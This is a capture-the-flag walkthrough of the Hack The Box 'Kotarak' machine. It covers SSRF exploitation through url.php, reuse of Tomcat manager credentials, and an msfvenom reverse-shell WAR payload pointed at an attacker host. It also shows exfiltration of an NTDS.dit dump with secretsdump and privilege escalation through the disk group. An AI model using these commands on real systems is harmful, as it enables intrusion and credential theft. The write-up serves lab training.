# [Kotarak](https://app.hackthebox.com/machines/kotarak)

```bash
nmap -p- --min-rate 10000 10.10.10.55 -Pn 
```

![Alt text](img/image.png)


After detection of open ports(22,8009,8080,60000), let's do greater nmap scan.

```bash
nmap -A -sC -sV -p22,8009,8080,60000 10.10.10.55   
```

![Alt text](img/image-1.png)



I start enumeration web application from port (60000). While looking at source code, I see `url.php` file here.

![Alt text](img/image-2.png)


I enter value into 'path' parameter.

![Alt text](img/image-3.png)


I change URL with local file by adding `file:///etc/passwd`.

![Alt text](img/image-4.png)


Let's look at localhost ports via this enumeration.

![Alt text](img/image-5.png)

So, I use fuzzer of owasp zap to find a port which can give me a lot of information (it is basically doing port scanning from URL).

For example ,we  can see information about SSH by typing 'localhost:22'

![Alt text](img/image-6.png)


I looked at port (888).

![Alt text](img/image-7.png)

I want to look at `backup` file, I cannot see anything.

![Alt text](img/image-8.png)


That's why, I choose the method too see this file directly.
`url=> https://10.10.10.55:60000/url.php?path=localhost:888?doc=backup`

![Alt text](img/image-9.png)


I grab credentials from here.

admin: 3@g01PdhB!

I access the web application's Tomcat manager from this [url](https://10.10.10.55:8080/manager/html).


![Alt text](img/image-10.png)


Let's create malicious `.war` file via `msfvenom` command.

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.16.6 LPORT=1337 -f war > dr4ks.war
```

![Alt text](img/image-11.png)


While clicking `dr4ks`, I will got reverse shell.

![Alt text](img/image-12.png)


I got reverse shell from port (1337).

![Alt text](img/image-13.png)


Let's make interactive shell.

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
Ctrl+Z
stty raw -echo; fg
export TERM=xterm
export SHELL=bash
```

![Alt text](img/image-14.png)


I found `.dit` file from this location '/home/tomcat/to_archive/pentest_data'. It means it can be data belongs to Active Directory like `NTDS.DIT` data which stores all information about Active Directory.

![Alt text](img/image-15.png)


Let's get this data by opening HTTP server.

1.Let's open HTTP server.

```bash
python3 -m http.server --bind 10.10.10.55 3169
```

![Alt text](img/image-16.png)


2.Then, grab these files via `wget` command to attacker machine.

```bash
wget http://10.10.10.55:3169/20170721114636_default_192.168.110.133_psexec.ntdsgrab._333512.dit
wget http://10.10.10.55:3169/20170721114637_default_192.168.110.133_psexec.ntdsgrab._089134.bin
```

![Alt text](img/image-17.png)


Let's use `secretsdump.py` script of `Impacket` to dump .dit database.

```bash
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -system 20170721114637_default_192.168.110.133_psexec.ntdsgrab._089134.bin -ntds 20170721114636_default_192.168.110.133_psexec.ntdsgrab._333512.dit LOCAL
```

![Alt text](img/image-18.png)


I grab the password HASH of `atanas` and administrator users.

![Alt text](img/image-19.png)


atanas: f16tomcat!


user.txt

![Alt text](img/image-20.png)


While running `id` command, it says that we are in `disk` group which is so important, almost means root access. (have permission to directories in /**dev**)

![Alt text](img/image-21.png)


Let's look at which directory is root access via `ls -al` command.

![Alt text](img/image-22.png)

I got /dev/dm-0 from here and use `debugfs` command to read data from here.

![Alt text](img/image-24.png)


While browsing here, I found a flag


![Alt text](img/image-23.png)